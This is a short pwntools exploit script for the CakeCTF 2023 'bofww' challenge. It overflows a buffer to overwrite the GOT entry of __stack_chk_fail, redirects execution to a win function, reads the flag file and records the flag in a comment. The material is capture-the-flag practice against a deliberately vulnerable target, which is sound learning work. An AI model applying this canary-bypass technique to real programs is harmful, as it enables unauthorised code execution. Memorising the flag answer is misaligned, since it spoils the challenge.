#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./bofww_patched")
libc = elf.libc
libc = ELF("./libc.so.6")

gdbscript = """
b main
c
"""

p = remote("bofww.2023.cakectf.com", 9002)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

payload = flat(
    0x4012f6, # win address
    0,
    p64(elf.got['__stack_chk_fail'])*0x30    # got _stack_check_fail spray
)

p.sendlineafter(b"name? ", payload)
p.sendline(b'1337')
p.recv()
p.sendline(b"cat /flag*")

p.interactive()
# CakeCTF{n0w_try_w1th0ut_w1n_func710n:)}
